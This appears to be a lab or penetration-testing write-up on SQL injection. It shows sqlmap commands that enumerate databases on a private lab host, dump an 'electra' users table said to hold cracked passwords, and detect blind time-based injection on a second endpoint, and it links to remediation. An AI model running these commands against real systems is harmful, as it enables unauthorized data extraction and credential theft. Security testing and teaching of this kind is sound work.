# Task 10 -- sqlmap Automation

**Vulnerability:** SQL Injection (CWE-89)
**Endpoints:** `GET /lookup`, `GET /quick/check`

---

## Steps

Starting with `/lookup?connection=` which we confirmed as injectable during recon:

```bash
sqlmap -u "http://192.168.77.80/lookup?connection=1" --batch --dbs
```

sqlmap confirms the injection point and returns the available databases:

<img width="1803" height="357" alt="image" src="https://github.com/user-attachments/assets/5e15bf32-7134-49b9-8e56-5581f9b82ede" />

With the target database identified we dump the users table:

```bash
sqlmap -u "http://192.168.77.80/lookup?connection=1" --batch -D electra -T users --dump
```

<img width="1929" height="718" alt="image" src="https://github.com/user-attachments/assets/baf08b30-b3ce-4880-938e-c4e4284db678" />

The full dump is saved at `~/.local/share/sqlmap/output/192.168.77.80/dump/electra/users.csv`.

Running the same scan against `/quick/check?connection=` tells a different story:

```bash
sqlmap -u "http://192.168.77.80/quick/check?connection=1" --batch --level=2
```

<img width="1025" height="143" alt="image" src="https://github.com/user-attachments/assets/6ea60c69-4719-4884-b84e-220d03274019" />

With no error output and no visible data reflection, the only signal available is
whether the database pauses on a `SLEEP()` call. This is blind SQLi so it is slower than
`/lookup` but just as exploitable.

## What this reveals to an attacker

The full users table is extractable without authentication, including plaintext
cracked passwords and customer connection IDs. Any parameter that hits the database
without sanitization is a potential extraction point regardless of whether errors
are visible.

## Remediation

See [remediation](../remediation.md)
